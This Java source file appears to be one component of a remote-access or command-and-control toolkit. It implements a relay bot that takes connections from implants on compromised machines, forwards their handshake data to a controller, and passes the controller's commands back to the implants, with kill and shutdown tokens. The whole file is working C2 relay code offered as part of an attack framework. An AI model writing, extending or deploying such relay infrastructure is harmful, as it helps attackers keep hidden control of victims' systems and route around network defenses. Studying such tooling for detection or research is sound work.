/**
 * This class is created to establish a forward connection to the next hop to relay a message
 * 
 * Ideally, relay bot is setup in proxy mode, as soon as an implant connects to the relay bot, the relay bot establishes a forward connection (i.e., this Forward Connection Class)
 * to connect to the controller and relay the message.  This class handles the listening of the forward socket to relay the received messages back to the connected agents
 * 
 * 
 * 			3- response >>>	 					 <<< 1- message
 * implant -----------------> [relay bot]   <-------------------
 *    ^							|	|							|
 *    |	handshake				|	|    handshake				|
 *     -------------------------	-------------------> [CONTROLLER]
 * 			<<< 2- message				  4- response >>>
 * 
 * @author Solomon Sonya
 * 
 */


package RelayBot;

import java.awt.*;
import java.awt.event.*;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.*;
import java.util.ArrayList;
import java.util.Scanner;

import Controller.Thread.Thread_Terminal;
import Implant.Driver;

public class RelayBot_ForwardConnection extends Thread implements Runnable, ActionListener
{
	public static final String strMyClassName = "RelayBot_ForwardConnection";
	
	Thread_Terminal parent = null;
	
	String randomNumberReceived = "";
	public String myUniqueDelimiter = "";
	
	private BufferedReader brIn = null;
	private PrintWriter pwOut = null;
	
	String forwardAddress = "";
	int forwardPort = 0;
	
	public Socket sktConnection = null;
	
	boolean continueRun = true;
	
	public boolean connectionEstablished = false;
	
	String relayedSystem_HandShake = "";//this is the data about the implant that is connected to the backward link of this relay
	
	public RelayBot_ForwardConnection(Thread_Terminal par, String addr, int prt, String relayedSysInfo)
	{
		try
		{
			parent = par;
			forwardAddress = addr;
			forwardPort = prt;
			relayedSystem_HandShake = relayedSysInfo;
			
			this.start();
			
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", strMyClassName, e, "", false);
		}
	}
	
	public void run()
	{
		try
		{
			
			boolean success = this.establishForwardConnection(this.forwardAddress, this.forwardPort);
			
			if(success)
			{
				//good connection, listen to the connection
				listenToConnection();
			}
			
			//out here... leave the thread to die softly...
			
			//let the while loop handle the rest!
			connectionEstablished = false;
		}
		catch(Exception e)
		{
			Driver.eop("Run", strMyClassName, e, "", false);
		}
	}
	
	public boolean listenToConnection()
	{
		try
		{
			String inputLine = "";
			
			while(continueRun && !sktConnection.isClosed() && ((inputLine = brIn.readLine()) != null && !inputLine.equals(Driver.DISCONNECT_TOKEN) && !inputLine.equals(Driver.DISCONNECT_RELAY)) )//listen until agent says disconnect
			{					
				//this thread is connected to the forward controller
				//therefore, what ever we receive from the controller, needs to be relayed back to the connected implant
				
				if(inputLine.equals(Driver.SHUTDOWN_RELAY))
				{
					Driver.sop("\nSHUTDOWN RECEIVED. TERMINATING RELAY NOW...");
					System.exit(0);
				}
				
				//otherwise, good line, relay it to agent
				
				this.relayMessage_BACKWARD(inputLine);
				
				
			//return to top of while to receive next command to execute
		}//end while
			
			
		if(inputLine.equals(Driver.DISCONNECT_RELAY))//throws null pointer exception if disconnected!
		{
			Driver.sop("Relay Disconnection notice received. Terminating forward connection to Controller now...");								
			
			Driver.sop("Sending Kill command to backward agent now...");
			try
			{
				relayMessage_BACKWARD(Driver.DISCONNECT_TOKEN);
			}catch(Exception e){}
			
			try
			{
				Driver.sop("Terminating own forward connection to controller now...");
				sktConnection.close();
			}catch(Exception e){}
			
			try
			{
				RelayBot_ServerSocket.removeImplantThread(this, this.getId());
			}catch(Exception e){}
			
		}
			
			
		//if we received the disconnect notice, terminate program
		if(inputLine.equals(Driver.DISCONNECT_TOKEN))//throws null pointer exception if disconnected!
		{
			Driver.sop("Implant Disconnection notice received. Terminating forward connection to Controller now...");								
			/*try
			{
				sktConnection.close();
			}catch(Exception e){}*/
			try
			{
				RelayBot_ServerSocket.removeImplantThread(this, this.getId());
			}catch(Exception e){}
			
			Driver.sop("Sending Kill command to backward agent now...");
			try
			{
				relayMessage_BACKWARD(Driver.DISCONNECT_TOKEN);
			}catch(Exception e){}
		}
			
			return true;
		}
		
		catch(NullPointerException npe)
		{
			Driver.sop("\nSocket to Controller was severed from Controller side!  - Connection Terminated");
			
		}
		
		catch(SocketException se)
		{
			Driver.sop("Confirmed, Forwardlink socket has been terminated. Attempting cleanup now...");
		}
		
		catch(Exception e)
		{
			Driver.eop("listenToConnection", strMyClassName, e, "", false);
		}
		
		
		//this.relayMessage_BACKWARD(Driver.DISCONNECT_TOKEN);
		try
		{
			if(parent.sktMyConnection != null && parent.sktMyConnection.isConnected())
			{
				Driver.sop("Terminating backward link to agent now...");
				parent.sktMyConnection.close();
				Driver.sop("Backlink socket closed.");
			}
		}catch(Exception e){}
		
		try
		{
			parent.continueRun = false;
			parent.killThread = true;
		}catch(Exception ee){}
		
		try
		{
			RelayBot_ServerSocket.removeImplantThread(this, this.getId());
		}catch(Exception e){}
		
		return false;
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			
			
			
			
		}
		catch(Exception e)
		{
			Driver.eop("AE", strMyClassName, e, "", false);
		}
	}
	
	/**
	 * This method establishes the forward connection and infinite while loops to wait on received data from the forward socket
	 * @param address
	 * @param port
	 * @return
	 */
	private boolean establishForwardConnection(String address, int port)
	{
		try
		{
			Driver.sop("Forwardlink initialized. - Attempting to connect to " + address + " : " + port);
			
			//connect to implant!
			sktConnection = new Socket(address, port);
			
			//determine command!
			String inputLine = "";
			brIn= null;
			pwOut = null; 
			
							
			if(sktConnection != null)
			{
				//good connection! open readers and determine command!
				
				//open streams
				Driver.sp("Forwardlink established!  Attempting to open streams on socket...");
				
				//input from implant
				brIn = new BufferedReader(new InputStreamReader(sktConnection.getInputStream()));
				
				//output to implant
				pwOut = new PrintWriter(new BufferedOutputStream(sktConnection.getOutputStream()));
				
				//Streams opened
				Driver.sop("Streams opened");
				
				connectionEstablished = true;
				
				//get connection data
				/*myLocalControllerPort = sktMyConnection.getLocalAddress().toString();
				myLocalController_IP = "" + sktMyConnection.getLocalPort();
				myVictim_RHOST_IP = "" + sktMyConnection.getInetAddress().toString();
				myRemote_RHOST_Port = "" + sktMyConnection.getPort();*/
				
				//Handshake!					
				
				this.relayMessage_FORWARD(Driver.RELAY_INITIAL_REGISTRATION_PROXY + Driver.getHandshakeData(Driver.delimeter_1));
												
				//read myUniqueID
				randomNumberReceived = brIn.readLine();
				
				//Format unique ID
				//this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + randomNumberReceived + "]";
				this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + randomNumberReceived + "]";
				
				//RELAY THE CONNECTED SYSTEM ON THE BACKWARD LINK
				this.relayMessage_FORWARD(Driver.RELAYED_AGENT_INITIAL_REGISTRATION + Driver.delimeter_1 + relayedSystem_HandShake);
				
				Driver.sop("HandShake complete. " + myUniqueDelimiter);
				
				
				
		}// end if sktConnection != null
			
			
			return true;
		}
		catch(NullPointerException npe)
		{
			Driver.sop("Streams closed!");
		}
		catch(SocketException se)
		{
			Driver.sop("Streams closed!");
		}
		catch( UnknownHostException uhe)
		{
			Driver.sop("* RELAY UNABLE TO ESTABLISH FORWARDLINK CONNECTION TO ADDRESS: " + address + " : " + port);
		}
		catch(IOException e)
		{
			Driver.sop("* * * RELAY UNABLE TO ESTABLISH FORWARDLINK CONNECTION TO ADDRESS: " + address + " : " + port);
		}
		catch(Exception e)
		{
			Driver.eop("establishForwardConnection", strMyClassName, e, "", true);
		}
		
		return false;
		
	}
	
	/**
	 * SEND THE MESSAGE TO THE FORWARD CONNECTED CONTROLLER
	 * @param msg
	 * @return
	 */
	public boolean relayMessage_FORWARD(String msg)
	{
		try
		{
			if(pwOut == null || sktConnection == null || sktConnection.isClosed())
			{				
				Driver.sop("* [*] Unable to relay message!  Forward Relay link is closed!!!");
				Driver.sop("msg: " + msg);
				/*//try and reestablish connection
				boolean success = this.establishForwardConnection(this.forwardAddress, this.forwardPort);
				
				if(success)
				{
					Driver.sop("Able to re-establish connection.  Relaying message now...");
					
					this.relayMessage_FORWARD(msg);
					
					//done, socket is opened again, return to listening to the socket
					return this.listenToConnection();
				}
				
				else//notify BACKWARD LINK - connected client that the relay is down
				{
					this.relayMessage_BACKWARD(Driver.RELAY_DOWN_MESSAGE);
				}*/
				
				//send alert message to controllers only!
				if(parent.i_am_connecting_to_controller)
				{
					this.relayMessage_BACKWARD(Driver.RELAY_DOWN_MESSAGE);
				}
				
				return false;
			}
			
			//otherwise, forward link is good, relay the message!
			
			//Driver.sop("Relaying Message forward from Agent to Controller: " + msg);
			
			this.pwOut.println(msg);
			this.pwOut.flush();
			
			return true;
		}
		
		catch(NullPointerException npe)
		{
			Driver.sop("* * * Unable to relay message!  Forward Relay link is closed!!!");
		}
		
		catch(Exception e)
		{
			Driver.eop("relayMessage_FORWARD", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	
	/**
	 * SEND THE MESSAGE TO THE ORIGINAL AGENT (IMPLANT) THAT FIRST CONNECTED TO THE RELAY (BACKWARD)
	 * @param msg
	 * @return
	 */
	public boolean relayMessage_BACKWARD(String msg)
	{
		try
		{
			if(parent == null || !parent.continueRun || parent.killThread)
			{
				Driver.sop("Relay Backward link is dead. Terminating this relay thread...");
				
				//close the socket connection
				this.continueRun = false;
			}
			
			//Driver.sop("Sending Recieved line from Controller to Agent: " + msg);
			
			parent.sendCommand_RAW(msg);
			
			return true;
		}
		
		catch(Exception e)
		{
			Driver.eop("relayMessage_BACKWARD", strMyClassName, e, "", false);
		}
		
		return false;
	}
	

}
